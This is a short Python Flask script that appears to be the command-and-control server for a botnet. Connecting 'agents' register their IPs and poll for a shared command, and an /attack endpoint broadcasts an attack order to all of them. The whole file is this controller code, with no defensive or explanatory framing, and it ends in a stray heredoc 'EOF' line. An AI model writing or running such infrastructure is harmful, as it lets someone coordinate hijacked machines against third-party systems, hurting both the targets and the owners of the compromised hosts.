from flask import Flask, request, jsonify
app = Flask(__name__)
agents = []
command = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if data.get('ip') not in agents:
        agents.append(data.get('ip'))
        print(f"[+] Agent connected. Total: {len(agents)}")
    return jsonify({"status": "ok"})

@app.route('/status', methods=['GET'])
def status():
    return jsonify({"command": command})

@app.route('/attack', methods=['POST'])
def attack():
    global command
    command = request.json
    print(f"[!] Attack triggered: {command}")
    return jsonify({"status": "started"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF
